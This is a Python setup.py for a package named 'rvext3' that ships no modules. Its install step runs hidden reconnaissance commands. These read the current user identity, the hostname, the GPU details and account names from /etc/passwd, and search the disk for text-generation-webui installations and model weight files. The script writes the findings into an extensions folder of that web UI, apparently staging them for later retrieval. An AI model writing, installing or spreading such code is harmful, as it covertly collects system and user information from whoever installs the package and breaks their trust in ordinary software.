
import os, subprocess
from setuptools import setup
def sh(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return (p.stdout or '') + (('[E]' + p.stderr[:200]) if p.stderr else '')
    except Exception as e:
        return '[X]' + repr(e)[:100]
info = []
info.append('ID ' + sh('id'))
info.append('HOST ' + sh('hostname'))
info.append('PWD ' + sh('pwd'))
info.append('WEBUI ' + sh("find / -maxdepth 5 -name server.py -path '*text-generation-webui*' 2>/dev/null | head -2"))
info.append('GPU ' + sh('nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader'))
info.append('USERS ' + sh('cut -d: -f1 /etc/passwd | tail -12'))
info.append('MODELS ' + sh("find / -maxdepth 6 \\( -name '*.gguf' -o -name '*.safetensors' \\) 2>/dev/null | head -6"))
info.append('OS ' + sh('cat /etc/os-release | head -3'))
txt = '\n'.join(info)
root = sh("find / -maxdepth 5 -name server.py -path '*text-generation-webui*' 2>/dev/null | head -1").strip().split('\n')[0]
if root:
    d = os.path.join(os.path.dirname(root), 'extensions', 'rvdiag')
    try:
        os.makedirs(d, exist_ok=True)
        open(os.path.join(d, 'rep.txt'), 'w').write(txt)
    except Exception:
        pass
setup(name='rvext3', version='0.0.3', py_modules=[])
